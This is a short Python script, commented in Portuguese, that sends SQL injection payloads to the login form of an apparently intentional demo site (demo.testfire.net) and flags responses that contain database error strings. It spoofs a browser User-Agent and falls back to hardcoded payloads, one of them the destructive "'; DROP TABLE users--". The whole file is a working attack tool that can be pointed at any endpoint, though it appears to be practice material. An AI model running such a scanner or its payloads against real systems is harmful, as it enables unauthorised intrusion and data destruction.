import requests
import random

def test_sql_injection(endpoint, method, parameter, payloads):
    vulnerabilities = []
    
    # Adicionando headers para parecer um navegador real
    headers = {'User-Agent': 'Mozilla/5.0'}
    
    # Erros mais comuns para detecção rápida
    sql_errors = ["mysql", "syntax error", "sqlstate", "oracle", "postgre"]

    for payload in payloads:
        payload = payload.strip() # Limpa \n do arquivo
        try:
            if method.upper() == "GET":
                r = requests.get(endpoint, params={parameter: payload}, headers=headers, timeout=5)
            else:
                r = requests.post(endpoint, data={parameter: payload}, headers=headers, timeout=5)
            
            print(f"{payload} -> {r}")
            # Verificação baseada em erro
            if any(error in r.text.lower() for error in sql_errors):
                print(f"[VULN] {payload}")
                vulnerabilities.append(payload)
                
        except Exception as e:
            continue

    return vulnerabilities

# Lendo o arquivo de forma segura
print("copiado ataques...")
try:
    with open("../data/arsenal_limpo.txt", "r") as f:
        # Pega 10 aleatórios, mas garante que não quebre se o arquivo for pequeno
        content = f.readlines()
        ataques = random.sample(content, min(len(content), 10))
except FileNotFoundError:
    print("Erro: Arquivo de payloads não encontrado.")
    ataques = ["' OR 1=1--", "'; DROP TABLE users--"]

# Testando
print("iniciando testes...")
res = test_sql_injection("http://demo.testfire.net/login.jsp", "POST", "username", ataques)